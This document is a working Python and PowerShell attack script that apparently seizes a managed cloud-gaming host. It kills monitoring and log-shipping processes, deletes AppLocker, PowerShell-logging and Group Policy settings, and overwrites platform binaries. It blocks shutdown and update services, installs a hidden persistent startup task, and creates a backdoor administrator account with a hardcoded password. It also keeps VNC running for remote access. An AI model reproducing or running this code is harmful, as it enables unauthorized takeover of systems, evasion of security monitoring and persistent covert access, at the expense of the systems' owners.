# =====================================================
#   IBRA UNLOCK ENGINE - Python Stage 1
#   NLK-HZ1 :: Kill Watchers > Unlock PS > Launch PS1
#   Run: C:\python37\python.exe IBRA_UNLOCK.py
# =====================================================

import ctypes, os, sys, winreg, subprocess, shutil, time, struct, base64

# ─────────────────────────────────────────────
# ADMIN CHECK / AUTO-ELEVATE
# ─────────────────────────────────────────────
def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas",
        sys.executable, " ".join([f'"{a}"' for a in sys.argv]),
        None, 1
    )
    sys.exit()

os.system("chcp 437 >nul 2>&1")
os.system("title IBRA UNLOCK ENGINE")

print("""
╔══════════════════════════════════════════════╗
║   IBRA UNLOCK ENGINE  —  NLK-HZ1 BYPASS     ║
║   Stage 1: Python Unlock > PS1 Execution     ║
╚══════════════════════════════════════════════╝
""")

# ─────────────────────────────────────────────
# PHASE 1 — KILL WATCHERS VIA CTYPES (bypass taskkill block)
# ─────────────────────────────────────────────
print("[PHASE 1] Killing watchers via direct WinAPI...")

PROCESS_TERMINATE     = 0x0001
PROCESS_QUERY_INFO    = 0x0400
TH32CS_SNAPPROCESS    = 0x00000002

class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize",              ctypes.c_ulong),
        ("cntUsage",            ctypes.c_ulong),
        ("th32ProcessID",       ctypes.c_ulong),
        ("th32DefaultHeapID",   ctypes.POINTER(ctypes.c_ulong)),
        ("th32ModuleID",        ctypes.c_ulong),
        ("cntThreads",          ctypes.c_ulong),
        ("th32ParentProcessID", ctypes.c_ulong),
        ("pcPriClassBase",      ctypes.c_long),
        ("dwFlags",             ctypes.c_ulong),
        ("szExeFile",           ctypes.c_char * 260),
    ]

def kill_by_name(target_name):
    target_name = target_name.lower().encode()
    snapshot = ctypes.windll.kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snapshot == ctypes.c_void_p(-1).value:
        return
    entry = PROCESSENTRY32()
    entry.dwSize = ctypes.sizeof(PROCESSENTRY32)
    killed = []
    if ctypes.windll.kernel32.Process32First(snapshot, ctypes.byref(entry)):
        while True:
            if entry.szExeFile.lower() == target_name:
                hProc = ctypes.windll.kernel32.OpenProcess(
                    PROCESS_TERMINATE, False, entry.th32ProcessID)
                if hProc:
                    ctypes.windll.kernel32.TerminateProcess(hProc, 1)
                    ctypes.windll.kernel32.CloseHandle(hProc)
                    killed.append(entry.th32ProcessID)
            if not ctypes.windll.kernel32.Process32Next(snapshot, ctypes.byref(entry)):
                break
    ctypes.windll.kernel32.CloseHandle(snapshot)
    return killed

# Kill order: watchers first, then supervisord, then children
kill_order = [
    "secure.exe", "geeLevel.exe", "supervisord.exe",
    "supervisord_alert", "rubrem.exe",
    "DeskGameServer.exe", "svcGameService.exe",
    "aria2c.exe", "gamecutter.exe", "atplay-monitor-rel.exe",
    "AtDesktop.exe", "AtUpDownProNode.exe",
    "AtGameLauncherNode.exe", "websocket.exe",
    "AtSocket.exe", "categraf.exe", "winlogbeat.exe",
    "filebeat.exe", "ttmon.exe"
]

for proc in kill_order:
    result = kill_by_name(proc)
    if result:
        print(f"  [+] KILLED {proc} (PIDs: {result})")
    time.sleep(0.05)

print("  [+] Kill phase done\n")
time.sleep(0.5)

# ─────────────────────────────────────────────
# PHASE 2 — REMOVE IFEO BLOCKS (PS, CMD, dll)
# ─────────────────────────────────────────────
print("[PHASE 2] Removing IFEO blocks on PowerShell/CMD...")

IFEO_PATH = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"

unblock_targets = [
    "powershell.exe", "powershell_ise.exe", "pwsh.exe",
    "cmd.exe", "taskmgr.exe", "regedit.exe", "mmc.exe",
    "taskkill.exe", "mshta.exe", "wscript.exe", "cscript.exe"
]

def remove_ifeo(exe_name):
    path = f"{IFEO_PATH}\\{exe_name}"
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0,
                             winreg.KEY_ALL_ACCESS)
        try:
            winreg.DeleteValue(key, "Debugger")
            print(f"  [+] IFEO removed: {exe_name}")
        except FileNotFoundError:
            pass
        winreg.CloseKey(key)
    except FileNotFoundError:
        pass
    except Exception as e:
        print(f"  [!] IFEO failed {exe_name}: {e}")

for t in unblock_targets:
    remove_ifeo(t)

# ─────────────────────────────────────────────
# PHASE 3 — REMOVE SRP + APPLOCK POLICIES
# ─────────────────────────────────────────────
print("\n[PHASE 3] Nuking SRP + AppLocker policies...")

def del_reg_tree(root, path):
    try:
        key = winreg.OpenKey(root, path, 0, winreg.KEY_ALL_ACCESS)
        idx = 0
        subkeys = []
        while True:
            try:
                subkeys.append(winreg.EnumKey(key, idx))
                idx += 1
            except OSError:
                break
        winreg.CloseKey(key)
        for sk in subkeys:
            del_reg_tree(root, f"{path}\\{sk}")
        winreg.DeleteKey(root, path)
        print(f"  [+] Deleted: {path}")
    except FileNotFoundError:
        pass
    except Exception as e:
        print(f"  [!] {path}: {e}")

# AppLocker
del_reg_tree(winreg.HKEY_LOCAL_MACHINE,
    r"SOFTWARE\Policies\Microsoft\Windows\SrpV2")

# Software Restriction Policy
del_reg_tree(winreg.HKEY_LOCAL_MACHINE,
    r"SOFTWARE\Policies\Microsoft\Windows\Safer")
del_reg_tree(winreg.HKEY_CURRENT_USER,
    r"SOFTWARE\Policies\Microsoft\Windows\Safer")

# PowerShell specific restrictions
ps_restrict_paths = [
    (winreg.HKEY_LOCAL_MACHINE,
     r"SOFTWARE\Policies\Microsoft\Windows\PowerShell"),
    (winreg.HKEY_CURRENT_USER,
     r"SOFTWARE\Policies\Microsoft\Windows\PowerShell"),
    (winreg.HKEY_LOCAL_MACHINE,
     r"SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"),
    (winreg.HKEY_LOCAL_MACHINE,
     r"SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"),
    (winreg.HKEY_LOCAL_MACHINE,
     r"SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"),
]
for root, path in ps_restrict_paths:
    del_reg_tree(root, path)

# General policies
general_policy_paths = [
    (winreg.HKEY_CURRENT_USER,
     r"Software\Microsoft\Windows\CurrentVersion\Policies"),
    (winreg.HKEY_LOCAL_MACHINE,
     r"Software\Microsoft\Windows\CurrentVersion\Policies"),
    (winreg.HKEY_CURRENT_USER,
     r"Software\Policies\Microsoft\Windows"),
    (winreg.HKEY_LOCAL_MACHINE,
     r"Software\Policies\Microsoft\Windows"),
]
for root, path in general_policy_paths:
    del_reg_tree(root, path)

# DisallowRun list (blocks specific exes)
disallow_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun"
del_reg_tree(winreg.HKEY_CURRENT_USER, disallow_path)
del_reg_tree(winreg.HKEY_LOCAL_MACHINE, disallow_path)

# ─────────────────────────────────────────────
# PHASE 4 — SET PS EXECUTION POLICY UNRESTRICTED
# ─────────────────────────────────────────────
print("\n[PHASE 4] Setting PowerShell execution policy...")

ps_shell_paths = [
    (winreg.HKEY_LOCAL_MACHINE,
     r"SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell"),
    (winreg.HKEY_CURRENT_USER,
     r"SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell"),
    (winreg.HKEY_LOCAL_MACHINE,
     r"SOFTWARE\Microsoft\PowerShell\3\ShellIds\Microsoft.PowerShell"),
]

for root, path in ps_shell_paths:
    try:
        key = winreg.CreateKey(root, path)
        winreg.SetValueEx(key, "ExecutionPolicy", 0,
                          winreg.REG_SZ, "Unrestricted")
        winreg.CloseKey(key)
        print(f"  [+] ExecutionPolicy = Unrestricted: {path}")
    except Exception as e:
        print(f"  [!] Failed: {e}")

# ─────────────────────────────────────────────
# PHASE 5 — DELETE GPO FOLDERS
# ─────────────────────────────────────────────
print("\n[PHASE 5] Deleting Group Policy folders...")

win_dir = os.environ.get("SystemRoot", r"C:\Windows")
gpo_dirs = [
    os.path.join(win_dir, "System32", "GroupPolicy"),
    os.path.join(win_dir, "System32", "GroupPolicyUsers"),
]
for d in gpo_dirs:
    if os.path.exists(d):
        try:
            shutil.rmtree(d, ignore_errors=True)
            print(f"  [+] Deleted: {d}")
        except Exception as e:
            print(f"  [!] {d}: {e}")

# ─────────────────────────────────────────────
# PHASE 6 — CREATE PS CLONE (bypass name-based block)
# ─────────────────────────────────────────────
print("\n[PHASE 6] Cloning PowerShell to bypass name-based blocks...")

ps_locations = [
    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    r"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe",
]
ps_clone_path = r"C:\ibra_ps.exe"

for psloc in ps_locations:
    if os.path.exists(psloc):
        try:
            shutil.copy2(psloc, ps_clone_path)
            print(f"  [+] PS cloned to: {ps_clone_path}")
            break
        except Exception as e:
            print(f"  [!] Clone failed from {psloc}: {e}")

# ─────────────────────────────────────────────
# PHASE 7 — WRITE PS1 TO DISK
# ─────────────────────────────────────────────
print("\n[PHASE 7] Writing IBRA_FINAL.ps1 to disk...")

PS1_PATH = r"C:\IBRA_FINAL.ps1"

PS1_CONTENT = r'''
#Requires -RunAsAdministrator
chcp 437 | Out-Null
$Host.UI.RawUI.WindowTitle = "IBRA FINAL v5.0"
Clear-Host

function Log($m,$c="Green"){Write-Host "  [+] $m" -ForegroundColor $c}
function Warn($m){Write-Host "  [!] $m" -ForegroundColor Yellow}
function Head($m){Write-Host "";Write-Host "[$m]" -ForegroundColor Cyan}

Write-Host @"
  =====================================================
   IBRA FINAL EXECUTION v5.0  —  NLK-HZ1 FULL BYPASS
  =====================================================
"@ -ForegroundColor Green

# ── PHASE A: NEUTER MASTER LAUNCHERS ──────────────
Head "A — NEUTER MASTER LAUNCHERS"
foreach($f in @("C:\run-server.bat","C:\run-server.bat.bak","M:\LK\start.bat")){
    if(Test-Path $f){
        Copy-Item $f "$f.orig" -Force -EA SilentlyContinue
        Set-Content $f "@echo off`r`nexit /b 0" -Force
        Log "Neutered: $f"
    }
}
foreach($ar in @("C:\AutoRun","M:\AutoRun")){
    if(Test-Path $ar){
        Get-ChildItem $ar -Include "*.bat","*.ps1","*.exe","*.cmd" -Recurse | ForEach-Object {
            Copy-Item $_.FullName "$($_.FullName).bak" -Force -EA SilentlyContinue
            Set-Content $_.FullName "@echo off`r`nexit /b 0" -Force -EA SilentlyContinue
            Log "AutoRun neutered: $($_.Name)"
        }
    }
}

# ── PHASE B: LOBOTOMY — REPLACE BINARIES ──────────
Head "B — LOBOTOMY (replace platform binaries)"
$dummy = "$env:SystemRoot\System32\timeout.exe"
$bins = @(
    "M:\LK\supervisord\programs\At\AtDesktop.exe",
    "M:\LK\supervisord\programs\At\AtUpDownProNode.exe",
    "M:\LK\supervisord\programs\At\AtGameLauncherNode.exe",
    "M:\LK\supervisord\programs\At\AtSocket.exe",
    "M:\LK\supervisord\programs\At\websocket.exe",
    "M:\LK\supervisord\programs\secure.exe",
    "M:\LK\supervisord\programs\geeLevel.exe",
    "M:\LK\supervisord\programs\gamecutter.exe",
    "M:\LK\supervisord\programs\categraf.exe",
    "M:\LK\supervisord\programs\aria2c.exe",
    "M:\LK\AtGameCutter\AtGameCutter.exe",
    "M:\LK\AtPlayMonitor\AtPlayMonitor.exe",
    "M:\LK\winlogbeat\winlogbeat.exe",
    "C:\HM-GameServer\DeskGameServer.exe",
    "C:\HM-GameServer\svcGameService.exe",
    "C:\Windows\SysWOW64\nxprun.exe",
    "C:\ttmon.exe"
)
foreach($b in $bins){
    if(Test-Path $b){
        try{
            Copy-Item $b "$b.bak" -Force -EA SilentlyContinue
            Copy-Item $dummy $b -Force
            Log "Neutered: $([IO.Path]::GetFileName($b))"
        }catch{ Warn "Failed: $b" }
    }
}

# Patch supervisord.conf
foreach($cf in (Get-ChildItem "M:\LK\supervisord\" -Recurse -Include "*.conf","*.ini" -EA SilentlyContinue)){
    $c = Get-Content $cf.FullName -Raw -EA SilentlyContinue
    if($c -match "autostart\s*=\s*true"){
        Set-Content $cf.FullName ($c -replace "autostart\s*=\s*true","autostart = false") -Force
        Log "Conf patched: $($cf.Name)"
    }
}

# Disable supervisord Windows service if exists
Get-Service -Name "*supervisord*","*LK*","*haima*" -EA SilentlyContinue | ForEach-Object {
    Stop-Service $_ -Force -EA SilentlyContinue
    Set-Service $_ -StartupType Disabled -EA SilentlyContinue
    Log "Service disabled: $($_.Name)"
}

# ── PHASE C: IFEO NUCLEAR BLOCK ───────────────────
Head "C — IFEO BLOCK ALL PLATFORM PROCESSES"
$ifeo = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
$blocks = @(
    "supervisord.exe","secure.exe","geeLevel.exe","gamecutter.exe",
    "AtDesktop.exe","AtUpDownProNode.exe","AtGameLauncherNode.exe",
    "AtSocket.exe","websocket.exe","categraf.exe","aria2c.exe",
    "winlogbeat.exe","filebeat.exe","rubrem.exe",
    "DeskGameServer.exe","svcGameService.exe",
    "nxprun.exe","ttmon.exe"
)
foreach($exe in $blocks){
    $p = "$ifeo\$exe"
    if(-not(Test-Path $p)){New-Item -Path $p -Force|Out-Null}
    Set-ItemProperty -Path $p -Name "Debugger" -Value "notepad.exe" -Force
    Log "IFEO blocked: $exe"
}

# ── PHASE D: SHUTDOWN IMMORTAL ────────────────────
Head "D — SHUTDOWN IMMORTAL"
powercfg -setacvalueindex SCHEME_CURRENT 4f971e89-eebd-4455-a8de-9e59040e7347 7648efa3-dd9c-4e3e-b566-50f929386280 0|Out-Null
powercfg -setdcvalueindex SCHEME_CURRENT 4f971e89-eebd-4455-a8de-9e59040e7347 7648efa3-dd9c-4e3e-b566-50f929386280 0|Out-Null
powercfg -setactive SCHEME_CURRENT|Out-Null
Log "Power button: DO NOTHING"

foreach($s in @("shutdown.exe","restart.exe","logoff.exe","taskkill.exe")){
    $p = "$ifeo\$s"
    if(-not(Test-Path $p)){New-Item -Path $p -Force|Out-Null}
    Set-ItemProperty -Path $p -Name "Debugger" -Value "notepad.exe" -Force
    Log "IFEO shutdown blocked: $s"
}

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableShutdown" /t REG_DWORD /d 1 /f|Out-Null
Log "Registry DisableShutdown: 1"

# Remove ALL scheduled tasks that do shutdown OR are platform tasks
Get-ScheduledTask -EA SilentlyContinue | ForEach-Object {
    $a = ($_.Actions|Out-String)
    if($a -match "shutdown\.exe|shutdown\s" -or
       $_.TaskName -match "supervisor|LK-|NLK|haima|HM-|geeLevel|secure|DeskGame|rubrem|winlogbeat"){
        Unregister-ScheduledTask -TaskName $_.TaskName -TaskPath $_.TaskPath -Confirm:$false -EA SilentlyContinue
        Log "Task deleted: $($_.TaskName)"
    }
}

# Revoke shutdown privileges
secedit /export /cfg "$env:TEMP\sp.inf" 2>$null|Out-Null
if(Test-Path "$env:TEMP\sp.inf"){
    $s=Get-Content "$env:TEMP\sp.inf"
    $s=$s -replace "SeShutdownPrivilege = .+","SeShutdownPrivilege = "
    $s=$s -replace "SeRemoteShutdownPrivilege = .+","SeRemoteShutdownPrivilege = "
    Set-Content "$env:TEMP\sp.inf" $s
    secedit /configure /db secedit.sdb /cfg "$env:TEMP\sp.inf" /areas USER_RIGHTS 2>$null|Out-Null
    Remove-Item "$env:TEMP\sp.inf" -EA SilentlyContinue
    Log "SeShutdownPrivilege: REVOKED"
}

# Block remote shutdown ports
netsh advfirewall firewall add rule name="IBRA-NoShutdown-TCP" dir=in action=block protocol=TCP localport=445,135,139|Out-Null
netsh advfirewall firewall add rule name="IBRA-NoShutdown-UDP" dir=in action=block protocol=UDP localport=445,135,137,138|Out-Null
Log "Remote shutdown ports: BLOCKED"

foreach($svc in @("RemoteRegistry","RemoteAccess","wuauserv","BITS")){
    Stop-Service $svc -Force -EA SilentlyContinue
    Set-Service $svc -StartupType Disabled -EA SilentlyContinue
    Log "Service disabled: $svc"
}

# Shield background job (kill bad procs every 100ms)
$shield = Start-Job -Name "IBRA-Shield" -ScriptBlock {
    $bad = @("supervisord","secure","geeLevel","rubrem","DeskGameServer",
             "svcGameService","winlogbeat","categraf","geeLevel")
    while($true){
        shutdown /a 2>$null
        Get-Process -Name $bad -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
        Start-Sleep -Milliseconds 100
    }
}
Log "Shield loop: RUNNING (Job $($shield.Id))"

# Persist via startup + scheduled task
$sp = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\IBRA-Shield.ps1"
Copy-Item $PSCommandPath $sp -Force -EA SilentlyContinue
attrib +h +s $sp 2>$null|Out-Null
$ta = New-ScheduledTaskAction -Execute "C:\ibra_ps.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$sp`""
$tt = New-ScheduledTaskTrigger -AtStartup
$ts = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew
Register-ScheduledTask -TaskName "IBRA-Shield" -Action $ta -Trigger $tt -Settings $ts -RunLevel Highest -Force -EA SilentlyContinue|Out-Null
Log "IBRA-Shield task: REGISTERED"

# ── PHASE E: REGISTRY + GPO CLEAN ─────────────────
Head "E — REGISTRY + GPO CLEAN"
$rc = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies",
    "HKCU:\Software\Policies\Microsoft\Windows",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies",
    "HKLM:\Software\Policies\Microsoft\Windows"
)
foreach($r in $rc){
    Remove-Item $r -Recurse -Force -EA SilentlyContinue
    Log "Cleaned: $r"
}
foreach($g in @("$env:WinDir\System32\GroupPolicy","$env:WinDir\System32\GroupPolicyUsers")){
    if(Test-Path $g){Remove-Item $g -Recurse -Force -EA SilentlyContinue;Log "GPO deleted: $g"}
}
gpupdate /force|Out-Null
Log "gpupdate /force: DONE"

# ── PHASE F: DELETE PLATFORM FILES ────────────────
Head "F — DELETE PLATFORM FILES"
$df = @("C:\run_gs_agent.py","C:\run-server.bat","C:\run-server.bat.bak",
        "C:\haima_server.lnk","C:\env_init.ps1","C:\env_init.reg",
        "C:\firewall_version","C:\ttmon.exe",
        "C:\Windows\SysWOW64\nxprun.exe","C:\websocket.exe")
foreach($f in $df){
    if(Test-Path $f){Remove-Item $f -Force -EA SilentlyContinue;Log "Deleted: $f"}
}
foreach($d in @("C:\zabbix","C:\Program Files\Ceph","C:\HM-GSU-Guest")){
    if(Test-Path $d){Remove-Item $d -Recurse -Force -EA SilentlyContinue;Log "Dir deleted: $d"}
}

# ── PHASE G: CREATE ADMIN USER IBRA86 ─────────────
Head "G — ADMIN USER"
$pw = ConvertTo-SecureString "PN1986" -AsPlainText -Force
New-LocalUser "IBRA86" -Password $pw -FullName "IBRA86" -Description "Bypass Admin" -EA SilentlyContinue|Out-Null
Add-LocalGroupMember -Group "Administrators" -Member "IBRA86" -EA SilentlyContinue
net user IBRA86 /expires:never|Out-Null
net user IBRA86 /passwordchg:no|Out-Null
Log "IBRA86: Admin, no expire"

# ── PHASE H: VNC KEEPALIVE ────────────────────────
Head "H — VNC KEEPALIVE"
Get-Service -Name "*vnc*" -EA SilentlyContinue | ForEach-Object {
    Set-Service $_ -StartupType Automatic -EA SilentlyContinue
    Start-Service $_ -EA SilentlyContinue
    Log "VNC service: ALIVE ($($_.Name))"
}
# Keep vncserver.exe running
if(-not(Get-Process "vncserver" -EA SilentlyContinue)){
    $vncPaths = @(
        "C:\Program Files\RealVNC\VNC Server\vncserver.exe",
        "C:\Program Files (x86)\RealVNC\VNC Server\vncserver.exe"
    )
    foreach($vp in $vncPaths){
        if(Test-Path $vp){Start-Process $vp -WindowStyle Hidden;Log "VNC started: $vp";break}
    }
}

# ── PHASE I: RESTORE UI ───────────────────────────
Head "I — RESTORE UI"
$lp='$L=Get-WinUserLanguageList;$L[0].InputMethodTips.Clear();$L[0].InputMethodTips.Add("0409:00000409");Set-WinUserLanguageList $L -Force;Set-WinDefaultInputMethodOverride -InputTip "0409:00000409"'
powershell -NoProfile -ExecutionPolicy Bypass -Command $lp|Out-Null
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3" /v Settings /t REG_BINARY /d 30000000fe2802000a00003000000 /f|Out-Null
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v TaskbarSizeMove /t REG_DWORD /d 0 /f|Out-Null
Log "Keyboard: US | Taskbar: shown"
taskkill /f /im ctfmon.exe 2>$null|Out-Null
Start-Sleep -Milliseconds 500
Start-Process explorer.exe
Log "ctfmon + Explorer: restarted"

# ── PHASE J: DOWNLOAD TOOLS ───────────────────────
Head "J — DOWNLOAD TOOLS"
$tools = @(
    @{url="https://gh-proxy.org/https://github.com/doublecmd/doublecmd/releases/download/v1.2.11/doublecmd-1.2.11.x86_64-win64.exe";out="C:\dblcmd.exe";name="Double Commander"},
    @{url="https://down.115.com/client/win/115br_v36.0.1_x64.exe";out="C:\115.exe";name="115 Browser"}
)
foreach($t in $tools){
    try{
        Invoke-WebRequest -Uri $t.url -OutFile $t.out -TimeoutSec 60 -EA SilentlyContinue
        Log "$($t.name): $($t.out)"
    }catch{Warn "$($t.name) download failed"}
}

Write-Host @"

  =====================================================
   SELESAI — NLK-HZ1 FULL BYPASS COMPLETE
  =====================================================
   Launchers    : NEUTERED
   Binaries     : REPLACED WITH DUMMY
   supervisord  : LOBOTOMIZED
   IFEO         : ALL PLATFORM PROCS BLOCKED
   Shutdown     : IMMORTAL
   Tasks        : PLATFORM TASKS DELETED
   Registry     : CLEANED
   Platform     : FILES DELETED
   User IBRA86  : ADMIN, NO EXPIRE
   VNC          : ALIVE (port 5900)
   Tools        : DOWNLOADED
  ─────────────────────────────────────────────────
   NEXT: Connect UUYC / Steam Link / VNC dari HP
  =====================================================
"@ -ForegroundColor Green

Read-Host "`n  Press Enter to exit"
'''

with open(PS1_PATH, "w", encoding="utf-8") as f:
    f.write(PS1_CONTENT)
print(f"  [+] PS1 written to: {PS1_PATH}")

# ─────────────────────────────────────────────
# PHASE 8 — LAUNCH PS1 (multiple fallback methods)
# ─────────────────────────────────────────────
print("\n[PHASE 8] Launching PS1 with fallback chain...")
time.sleep(0.5)

ps_exe_candidates = [
    r"C:\ibra_ps.exe",   # our clone
    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    r"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe",
    r"C:\Windows\System32\pwsh.exe",
]

ps_args = f'-NoProfile -ExecutionPolicy Bypass -File "{PS1_PATH}"'
launched = False

for ps_exe in ps_exe_candidates:
    if os.path.exists(ps_exe):
        try:
            ret = subprocess.Popen(
                [ps_exe] + ps_args.split(),
                creationflags=subprocess.CREATE_NEW_CONSOLE
            )
            print(f"  [+] LAUNCHED via: {ps_exe}")
            launched = True
            break
        except Exception as e:
            print(f"  [!] Failed via {ps_exe}: {e}")

if not launched:
    # Last resort: encode PS1 as base64 and run via -EncodedCommand
    print("  [!] All paths failed, trying EncodedCommand...")
    try:
        with open(PS1_PATH, "r", encoding="utf-8") as f:
            script = f.read()
        encoded = base64.b64encode(script.encode("utf-16-le")).decode("ascii")
        for ps_exe in ps_exe_candidates:
            if os.path.exists(ps_exe):
                subprocess.Popen(
                    [ps_exe, "-NoProfile", "-ExecutionPolicy", "Bypass",
                     "-EncodedCommand", encoded],
                    creationflags=subprocess.CREATE_NEW_CONSOLE
                )
                print(f"  [+] EncodedCommand launched via: {ps_exe}")
                launched = True
                break
    except Exception as e:
        print(f"  [!] EncodedCommand failed: {e}")

# gpupdate cleanup
os.system("gpupdate /force >nul 2>&1")

print("""
╔══════════════════════════════════════════════╗
║   IBRA UNLOCK ENGINE — STAGE 1 COMPLETE     ║
║   PS1 launched in separate window            ║
║   Tunggu IBRA FINAL v5.0 selesai...          ║
╚══════════════════════════════════════════════╝
""")
input("Press Enter to exit unlock engine...")